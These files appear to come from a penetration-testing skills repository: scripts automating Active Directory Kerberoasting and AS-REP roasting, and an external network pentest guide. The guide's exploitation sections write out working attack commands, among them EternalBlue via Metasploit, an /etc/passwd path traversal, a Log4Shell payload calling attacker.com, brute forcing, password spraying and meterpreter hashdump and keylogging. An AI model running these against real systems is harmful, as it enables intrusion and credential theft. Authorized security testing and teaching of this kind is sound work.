def find_asrep_roastable(users: list[dict]) -> list[dict]:
    """Identify accounts vulnerable to AS-REP Roasting."""
    findings = []
    for user in users:
        if user["kerberos_preauth_not_required"] and not user["account_disabled"]:
            findings.append({
                "type": "asrep_roastable",
                "severity": "high",
                "account": user["username"],
                "detail": "Kerberos pre-authentication disabled - AS-REP Roasting possible",
            })
    return findings


def find_kerberoastable(users: list[dict]) -> list[dict]:
    """Identify accounts vulnerable to Kerberoasting."""
    findings = []
    for user in users:
        if user["has_spn"] and not user["account_disabled"]:
            findings.append({
                "type": "kerberoastable",
                "severity": "high",
                "account": user["username"],
                "detail": "User account with SPN set - Kerberoasting possible",
            })
    return findings


def check_password_policy(conn: Connection, base_dn: str) -> list[dict]:
    """Audit domain password policy."""
    conn.search(base_dn, "(objectClass=domain)", search_scope=SUBTREE,
                attributes=["minPwdLength", "lockoutThreshold", "pwdHistoryLength",
                             "maxPwdAge", "minPwdAge", "lockoutDuration"])
    findings = []
    if conn.entries:
        entry = conn.entries[0]
        min_len = int(str(entry.minPwdLength)) if hasattr(entry, "minPwdLength") else 0
        lockout = int(str(entry.lockoutThreshold)) if hasattr(entry, "lockoutThreshold") else 0
        if min_len < 12:
            findings.append({
                "type": "weak_password_policy",
                "severity": "high",
                "detail": f"Minimum password length is {min_len} (recommended: 12+)",
            })
        if lockout == 0:
            findings.append({
                "type": "no_account_lockout",
                "severity": "critical",
                "detail": "No account lockout policy - brute force attacks possible",
            })
    return findings


def run_impacket_getspns(dc_ip: str, domain: str, username: str, password: str) -> dict:
    """Run impacket GetUserSPNs for Kerberoasting."""
    cmd = ["python3", "-m", "impacket.examples.GetUserSPNs",
           f"{domain}/{username}:{password}", "-dc-ip", dc_ip, "-request"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return {"success": True, "output": result.stdout[:5000], "errors": result.stderr[:1000]}
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return {"success": False, "error": str(e)}


def generate_report(server_url: str, username: str, password: str,
                    use_ssl: bool, dc_ip: str = None) -> dict:
    """Run full AD pentest enumeration and build report."""
    conn = connect_ldap(server_url, username, password, use_ssl)
    domain_info = get_domain_info(conn)
    base_dn = domain_info["default_naming_context"]

    users = enumerate_users(conn, base_dn)
    findings = []
    findings.extend(find_asrep_roastable(users))
    findings.extend(find_kerberoastable(users))
    findings.extend(check_password_policy(conn, base_dn))

    conn.unbind()

    from collections import Counter
    severity_counts = Counter(f["severity"] for f in findings)
    return {
        "report": "ad_penetration_test",
        "generated_at": datetime.utcnow().isoformat() + "Z",
        "domain_info": domain_info,
        "total_users": len(users),
        "total_findings": len(findings),
        "severity_summary": dict(severity_counts),
        "findings": findings,
    }


def main():
    parser = argparse.ArgumentParser(description="AD Penetration Test Agent")
    parser.add_argument("--server", required=True, help="LDAP server URL (ldaps://dc.example.com)")
    parser.add_argument("--username", required=True, help="Domain username (DOMAIN\\\\user)")
    parser.add_argument("--password", required=True, help="Password")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL")
    parser.add_argument("--dc-ip", help="DC IP for impacket tools")
    parser.add_argument("--output", help="Output JSON file path")
    args = parser.parse_args()

    report = generate_report(args.server, args.username, args.password,
                             not args.no_ssl, args.dc_ip)
    output = json.dumps(report, indent=2)
    if args.output:
        Path(args.output).write_text(output, encoding="utf-8")
        print(f"Report written to {args.output}")
    else:
        print(output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-active-directory-penetration-test/scripts/process.py =====
#!/usr/bin/env python3
"""
Active Directory Penetration Test — Automation Process

Automates AD enumeration, Kerberos attack setup, and reporting.
Requires: impacket, bloodhound-python, netexec, ldap3.

Usage:
    python process.py --domain corp.local --dc-ip 10.0.0.5 -u testuser -p Password123 --output ./results
"""

import subprocess
import json
import os
import argparse
import datetime
from pathlib import Path


def run_command(cmd: list[str], timeout: int = 300) -> tuple[str, str, int]:
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except FileNotFoundError:
        return "", f"Not found: {cmd[0]}", -1


def enumerate_domain_users(domain: str, dc_ip: str, user: str, password: str,
                            output_dir: Path) -> list[str]:
    """Enumerate domain users via LDAP."""
    print("[*] Enumerating domain users...")
    stdout, stderr, rc = run_command(
        ["netexec", "smb", dc_ip, "-u", user, "-p", password, "-d", domain, "--users"]
    )
    users_file = output_dir / "domain_users.txt"
    users = []
    for line in stdout.splitlines():
        if "\\\\"-1 not in line and domain.split(".")[0].upper() in line.upper():
            parts = line.strip().split()
            for part in parts:
                if "\\" in part:
                    username = part.split("\\")[-1]
                    users.append(username)
    with open(users_file, "w") as f:
        f.write("\n".join(users))
    print(f"[+] Found {len(users)} domain users")
    return users


def get_spn_users(domain: str, dc_ip: str, user: str, password: str,
                   output_dir: Path) -> str:
    """Find Kerberoastable accounts."""
    print("[*] Finding Kerberoastable service accounts...")
    output_file = output_dir / "kerberoast_hashes.txt"
    stdout, stderr, rc = run_command(
        ["impacket-GetUserSPNs", f"{domain}/{user}:{password}",
         "-dc-ip", dc_ip, "-outputfile", str(output_file), "-request"]
    )
    if rc == 0:
        print(f"[+] Kerberoast hashes saved to {output_file}")
    else:
        print(f"[-] Kerberoasting: {stderr[:200]}")
    return str(output_file)


def get_asrep_users(domain: str, dc_ip: str, users_file: str,
                     output_dir: Path) -> str:
    """Find AS-REP Roastable accounts."""
    print("[*] Finding AS-REP Roastable accounts...")
    output_file = output_dir / "asrep_hashes.txt"
    stdout, stderr, rc = run_command(
        ["impacket-GetNPUsers", f"{domain}/", "-usersfile", users_file,
         "-dc-ip", dc_ip, "-outputfile", str(output_file), "-format", "hashcat"]
    )
    if rc == 0:
        print(f"[+] AS-REP hashes saved to {output_file}")
    return str(output_file)


def collect_bloodhound(domain: str, dc_ip: str, user: str, password: str,
                        output_dir: Path) -> None:
    """Run BloodHound data collection."""
    print("[*] Collecting BloodHound data...")
    stdout, stderr, rc = run_command(
        ["bloodhound-python", "-u", user, "-p", password,
         "-d", domain, "-ns", dc_ip, "-c", "all", "--zip"],
        timeout=600
    )
    if rc == 0:
        print("[+] BloodHound data collected")
    else:
        print(f"[-] BloodHound: {stderr[:200]}")


def check_adcs(domain: str, dc_ip: str, user: str, password: str,
                output_dir: Path) -> str:
    """Check for ADCS vulnerabilities."""
    print("[*] Checking ADCS for vulnerable templates...")
    output_file = output_dir / "adcs_findings.txt"
    stdout, stderr, rc = run_command(
        ["certipy", "find", "-u", f"{user}@{domain}", "-p", password,
         "-dc-ip", dc_ip, "-vulnerable", "-stdout"]
    )
    with open(output_file, "w") as f:
        f.write(stdout)
    if "ESC" in stdout:
        print("[+] Vulnerable ADCS templates found!")
    else:
        print("[*] No vulnerable ADCS templates detected")
    return str(output_file)


def generate_report(domain: str, output_dir: Path) -> str:
    """Generate AD pentest report."""
    print("[*] Generating report...")
    report_file = output_dir / "ad_pentest_report.md"
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    kerberoast_count = 0
    kf = output_dir / "kerberoast_hashes.txt"
    if kf.exists():
        with open(kf) as f:
            kerberoast_count = sum(1 for line in f if line.strip() and line.startswith("$krb5tgs$"))

    asrep_count = 0
    af = output_dir / "asrep_hashes.txt"
    if af.exists():
        with open(af) as f:
            asrep_count = sum(1 for line in f if line.strip() and line.startswith("$krb5asrep$"))

    with open(report_file, "w") as f:
        f.write(f"# Active Directory Penetration Test Report\n\n")
        f.write(f"**Domain:** {domain}\n")
        f.write(f"**Generated:** {timestamp}\n\n---\n\n")
        f.write("## Kerberos Attack Results\n\n")
        f.write(f"- Kerberoastable accounts: **{kerberoast_count}**\n")
        f.write(f"- AS-REP Roastable accounts: **{asrep_count}**\n\n")
        f.write("## Recommendations\n\n")
        f.write("1. Convert service accounts to Group Managed Service Accounts (gMSA)\n")
        f.write("2. Enforce 25+ character passwords for remaining SPNs\n")
        f.write("3. Enable Kerberos pre-authentication for all accounts\n")
        f.write("4. Audit and remediate ADCS template vulnerabilities\n")
        f.write("5. Implement tiered administration model\n")
        f.write("6. Deploy monitoring for DCSync and Golden Ticket attacks\n")

    print(f"[+] Report: {report_file}")
    return str(report_file)


def main():
    parser = argparse.ArgumentParser(description="AD Pentest Automation")
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("-u", "--username", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("--output", default="./results")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    print("=" * 60)
    print(f" AD Penetration Test — {args.domain}")
    print("=" * 60)

    users = enumerate_domain_users(args.domain, args.dc_ip, args.username, args.password, output_dir)
    users_file = str(output_dir / "domain_users.txt")

    get_spn_users(args.domain, args.dc_ip, args.username, args.password, output_dir)
    get_asrep_users(args.domain, args.dc_ip, users_file, output_dir)
    collect_bloodhound(args.domain, args.dc_ip, args.username, args.password, output_dir)
    check_adcs(args.domain, args.dc_ip, args.username, args.password, output_dir)
    generate_report(args.domain, output_dir)

    print("\n[+] AD pentest automation complete")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-external-network-penetration-test/SKILL.md =====
---
name: performing-external-network-penetration-test
description: Conduct a comprehensive external network penetration test to identify
  vulnerabilities in internet-facing infrastructure using PTES methodology, reconnaissance,
  scanning, exploitation, and reporting.
domain: cybersecurity
subdomain: penetration-testing
tags:
- external-pentest
- network-security
- PTES
- OSSTMM
- Nmap
- Metasploit
- vulnerability-assessment
- reconnaissance
- exploitation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1592
---

# Performing External Network Penetration Test

## Overview

An external network penetration test simulates a real-world attacker targeting an organization's internet-facing assets such as firewalls, web servers, mail servers, DNS servers, VPN gateways, and cloud endpoints. The objective is to identify exploitable vulnerabilities before malicious actors do, following frameworks like PTES (Penetration Testing Execution Standard), OSSTMM, and NIST SP 800-115.


## When to Use

- When conducting security assessments that involve performing external network penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Written authorization (Rules of Engagement document signed by asset owner)
- Defined scope: IP ranges, domains, subdomains, and exclusions
- Testing environment: Kali Linux or Parrot OS with updated tools
- VPN/dedicated testing infrastructure to avoid IP blocks
- Coordination with SOC/NOC for timing windows

## Phase 1 — Pre-Engagement and Scoping

### Define Rules of Engagement

```
Scope:
  - Target IP ranges: 203.0.113.0/24, 198.51.100.0/24
  - Domains: *.target.com, *.target.io
  - Exclusions: 203.0.113.50 (production DB), *.staging.target.com
  - Testing window: Mon-Fri 22:00-06:00 UTC
  - Emergency contact: SOC Lead — +1-555-0100
  - Authorization ID: PENTEST-2025-EXT-042
```

### Legal Documentation Checklist

| Document | Status | Owner |
|----------|--------|-------|
| Master Service Agreement (MSA) | Signed | Legal |
| Statement of Work (SOW) | Signed | PM |
| Rules of Engagement (RoE) | Signed | CISO |
| Get-Out-of-Jail Letter | Signed | CTO |
| NDA | Signed | Legal |
| Insurance Certificate | Verified | Risk |

## Phase 2 — Reconnaissance (Information Gathering)

### Passive Reconnaissance

```bash
# OSINT — Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com -o amass_subs.txt
cat subdomains.txt amass_subs.txt | sort -u > all_subs.txt

# DNS record enumeration
dig target.com ANY +noall +answer
dig target.com MX +short
dig target.com NS +short
dig target.com TXT +short

# WHOIS and ASN lookup
whois target.com
whois -h whois.radb.net -- '-i origin AS12345'

# Certificate Transparency log search
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Google dorking
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com intitle:"index of"

# Shodan enumeration
shodan search "org:Target Corp" --fields ip_str,port,product
shodan host 203.0.113.10

# Email harvesting
theHarvester -d target.com -b all -l 500 -f theharvester_results

# GitHub/GitLab secret scanning
trufflehog github --org=targetcorp --concurrency=5
gitleaks detect --source=https://github.com/targetcorp/repo
```

### Active Reconnaissance

```bash
# Host discovery — ping sweep
nmap -sn 203.0.113.0/24 -oG ping_sweep.gnmap

# TCP SYN scan — top 1000 ports
nmap -sS -sV -O -T4 203.0.113.0/24 -oA tcp_scan

# Full TCP port scan
nmap -sS -p- -T4 --min-rate 1000 203.0.113.0/24 -oA full_tcp

# UDP scan — top 100 ports
nmap -sU --top-ports 100 -T4 203.0.113.0/24 -oA udp_scan

# Service version and script scan
nmap -sV -sC -p 21,22,25,53,80,110,143,443,445,993,995,3389,8080,8443 203.0.113.0/24 -oA service_scan

# SSL/TLS enumeration
sslscan 203.0.113.10:443
testssl.sh --full https://target.com

# Web technology fingerprinting
whatweb -v https://target.com
wappalyzer https://target.com
```

## Phase 3 — Vulnerability Analysis

### Automated Scanning

```bash
# Nessus scan (via CLI)
nessuscli scan --new --name "External-Pentest-2025" \
  --targets 203.0.113.0/24 \
  --policy "Advanced Network Scan"

# OpenVAS scan
gvm-cli socket --xml '<create_task>
  <name>External Pentest</name>
  <target id="target-uuid"/>
  <config id="daba56c8-73ec-11df-a475-002264764cea"/>
</create_task>'

# Nuclei vulnerability scanner
nuclei -l all_subs.txt -t cves/ -t exposures/ -t misconfigurations/ \
  -severity critical,high -o nuclei_results.txt

# Nikto web server scan
nikto -h https://target.com -output nikto_results.html -Format htm

# Directory and file enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,txt -o gobuster_results.txt
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  --depth 3 -o ferox_results.txt
```

### Manual Vulnerability Validation

```bash
# Check for known CVEs on identified services
searchsploit apache 2.4.49
searchsploit openssh 8.2

# Test for default credentials
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  ssh://203.0.113.10 -t 4

# Test VPN endpoints
ike-scan 203.0.113.20
# Check for IKEv1 aggressive mode

# SNMP enumeration
snmpwalk -v2c -c public 203.0.113.30
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 203.0.113.0/24

# SMTP enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 203.0.113.25
```

## Phase 4 — Exploitation

### Network Service Exploitation

```bash
# Metasploit — EternalBlue (MS17-010) example
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 203.0.113.15
set LHOST 10.10.14.5
set LPORT 4444
exploit

# Apache RCE — CVE-2021-41773 / CVE-2021-42013
curl -s --path-as-is "https://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# ProxyShell exploitation (Exchange)
python3 proxyshell_exploit.py -u https://mail.target.com -e admin@target.com

# Log4Shell (CVE-2021-44228) testing
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/exploit}' https://target.com/api
```

### Web Application Exploitation

```bash
# SQL Injection with sqlmap
sqlmap -u "https://target.com/page?id=1" --batch --dbs --risk=3 --level=5

# XSS payload testing
dalfox url "https://target.com/search?q=test" --skip-bav

# Command injection testing
commix --url="https://target.com/ping?host=127.0.0.1" --batch

# File upload bypass
# Upload PHP shell with double extension: shell.php.jpg
# Test content-type bypass: application/octet-stream -> image/jpeg
```

### Password Attacks

```bash
# Brute force RDP
crowbar -b rdp -s 203.0.113.40/32 -u admin -C /usr/share/wordlists/rockyou.txt -n 4

# Spray attack against OWA
sprayhound -U users.txt -p 'Spring2025!' -d target.com -url https://mail.target.com/owa

# Crack captured hashes
hashcat -m 5600 captured_ntlmv2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Phase 5 — Post-Exploitation

```bash
# Establish persistence (authorized testing only)
# Meterpreter session
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
meterpreter> run post/multi/recon/local_exploit_suggester

# Privilege escalation check
# Linux
./linpeas.sh | tee linpeas_output.txt
# Windows
.\winPEAS.exe | tee winpeas_output.txt

# Data exfiltration proof
# Create proof file (DO NOT exfiltrate real sensitive data)
echo "PENTEST-PROOF-$(date +%Y%m%d)" > /tmp/pentest_proof.txt

# Network pivoting through compromised host
# Set up SOCKS proxy via SSH
ssh -D 9050 user@203.0.113.15
proxychains nmap -sT -p 80,443,445 10.0.0.0/24

# Screenshot and evidence collection
meterpreter> screenshot
meterpreter> keyscan_start
```

## Phase 6 — Reporting

### Finding Classification (CVSS v3.1)

| Severity | CVSS Range | Count | Example |
|----------|-----------|-------|---------|
| Critical | 9.0-10.0 | 2 | RCE via unpatched Exchange (ProxyShell) |
| High | 7.0-8.9 | 5 | SQL Injection in customer portal |
| Medium | 4.0-6.9 | 8 | Missing security headers, TLS 1.0 |
| Low | 0.1-3.9 | 12 | Information disclosure via server banners |
| Info | 0.0 | 6 | Open ports documentation |

### Report Structure

```
1. Executive Summary
   - Scope and objectives
   - Key findings summary
   - Risk rating overview
   - Strategic recommendations

2. Technical Findings
   For each finding:
   - Title and CVSS score
   - Affected asset(s)
   - Description and impact
   - Steps to reproduce (with screenshots)
   - Evidence/proof of exploitation
   - Remediation recommendation
   - References (CVE, CWE)

3. Methodology
   - Tools used
   - Testing timeline
   - Frameworks followed (PTES, OWASP)

4. Appendices
   - Full scan results
   - Network diagrams
   - Raw tool output
```

## Remediation Priority Matrix

| Priority | Timeline | Action |
|----------|----------|--------|
| P1 — Critical | 24-48 hours | Patch RCE vulnerabilities, disable exposed admin panels |
| P2 — High | 1-2 weeks | Fix injection flaws, implement MFA |
| P3 — Medium | 30 days | Harden TLS configs, add security headers |
| P4 — Low | 60-90 days | Remove version banners, update documentation |

## Tools Reference

| Tool | Purpose | License |
|------|---------|---------|
| Nmap | Port scanning and service enumeration | GPLv2 |
| Metasploit | Exploitation framework | BSD |
| Burp Suite Pro | Web application testing | Commercial |
| Nuclei | Vulnerability scanning | MIT |
| Subfinder | Subdomain enumeration | MIT |
| SQLMap | SQL injection testing | GPLv2 |
| Nessus | Vulnerability scanner | Commercial |
| Gobuster | Directory brute-forcing | Apache 2.0 |
| Hashcat | Password cracking | MIT |
| theHarvester | OSINT email/domain harvesting | GPLv2 |

## References

- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/
- OWASP Testing Guide v4.2: https://owasp.org/www-project-web-security-testing-guide/
- NIST SP 800-115: Technical Guide to Information Security Testing: https://csrc.nist.gov/publications/detail/sp/800-115/final
- OSSTMM v3: https://www.isecom.org/OSSTMM.3.pdf
- MITRE ATT&CK: https://attack.mitre.org/

===== END FILE =====


===== FILE: skills/performing-external-network-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-external-network-penetration-test/assets/template.md =====
# External Network Penetration Test — Report Template

## Document Control

| Field | Value |
|-------|-------|
| Client | [Client Name] |
| Assessment Type | External Network Penetration Test |
| Test Period | [Start Date] — [End Date] |
| Report Version | 1.0 |
| Classification | CONFIDENTIAL |
| Prepared By | [Tester Name], [Certification] |
| Reviewed By | [QA Reviewer] |
| Authorization ID | [PENTEST-YYYY-EXT-NNN] |

---

## 1. Executive Summary

### 1.1 Engagement Overview
[Organization Name] engaged [Testing Company] to perform an external network penetration test against its internet-facing infrastructure. The assessment was conducted between [dates] following the PTES methodology.

### 1.2 Scope
- **IP Ranges:** [CIDR ranges]
- **Domains:** [domain list]
- **Exclusions:** [excluded assets]

### 1.3 Key Findings Summary

| Severity | Count |
|----------|-------|
| Critical | [N] |
| High | [N] |
| Medium | [N] |
| Low | [N] |
| Informational | [N] |

### 1.4 Overall Risk Rating
**[CRITICAL / HIGH / MEDIUM / LOW]**

[Brief narrative of overall security posture]

### 1.5 Top Strategic Recommendations
1. [Recommendation 1]
2. [Recommendation 2]
3. [Recommendation 3]

---

## 2. Technical Findings

### Finding [N]: [Title]

| Attribute | Detail |
|-----------|--------|
| Severity | [Critical/High/Medium/Low] |
| CVSS v3.1 | [Score] — [Vector String] |
| CVE | [CVE-YYYY-NNNNN] |
| CWE | [CWE-NNN] |
| Affected Asset | [IP/hostname:port] |
| Status | [Exploited / Validated / Potential] |

**Description:**
[Detailed description of the vulnerability]

**Impact:**
[Business and technical impact]

**Steps to Reproduce:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Evidence:**
![Screenshot](./evidence/finding_N_screenshot.png)

```
[Terminal output / HTTP request-response]
```

**Remediation:**
- [Primary fix]
- [Alternative mitigation]
- [Detection recommendation]

**References:**
- [URL to CVE/advisory]
- [Vendor documentation]

---

## 3. Methodology

### 3.1 Framework
- PTES (Penetration Testing Execution Standard)
- OWASP Testing Guide v4.2
- MITRE ATT&CK Framework

### 3.2 Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | [ver] | Port scanning, service enumeration |
| Metasploit | [ver] | Exploitation framework |
| Burp Suite Pro | [ver] | Web application testing |
| Nuclei | [ver] | Vulnerability scanning |
| SQLMap | [ver] | SQL injection testing |
| Hashcat | [ver] | Password cracking |

### 3.3 Testing Timeline

| Date | Phase | Activities |
|------|-------|-----------|
| [Date] | Reconnaissance | OSINT, subdomain enum, port scanning |
| [Date] | Vulnerability Analysis | Automated and manual scanning |
| [Date] | Exploitation | Service and web application exploitation |
| [Date] | Post-Exploitation | Privilege escalation, evidence collection |
| [Date] | Reporting | Findings documentation and QA |

---

## 4. Appendices

### A. Full Scan Results
[Attached as separate files]

### B. Network Topology Discovered
[Network diagram]

### C. Credentials Obtained
| Source | Account Type | Method |
|--------|-------------|--------|
| [Service] | [Role] | [Attack method] |

### D. Glossary

| Term | Definition |
|------|-----------|
| CVSS | Common Vulnerability Scoring System |
| CVE | Common Vulnerabilities and Exposures |
| RCE | Remote Code Execution |
| PTES | Penetration Testing Execution Standard |

---

*This document is classified CONFIDENTIAL and intended solely for [Client Name].*

===== END FILE =====


===== FILE: skills/performing-external-network-penetration-test/references/api-reference.md =====
# API Reference — Performing External Network Penetration Test

## Libraries Used
- **socket**: TCP port scanning and banner grabbing
- **subprocess**: Execute nmap with XML output parsing
- **dns.resolver** (dnspython): DNS record enumeration and subdomain discovery
- **ssl**: TLS certificate inspection and cipher analysis
- **xml.etree.ElementTree**: Parse nmap XML output

## CLI Interface
```
python agent.py scan --host <target_ip> [--ports 22 80 443]
python agent.py nmap --target <ip_or_range> [--type quick|full|vuln|udp]
python agent.py dns --domain <domain>
python agent.py ssl --host <hostname> [--port 443]
```

## Core Functions

### `tcp_port_scan(host, ports)` — Scan TCP ports with banner grabbing
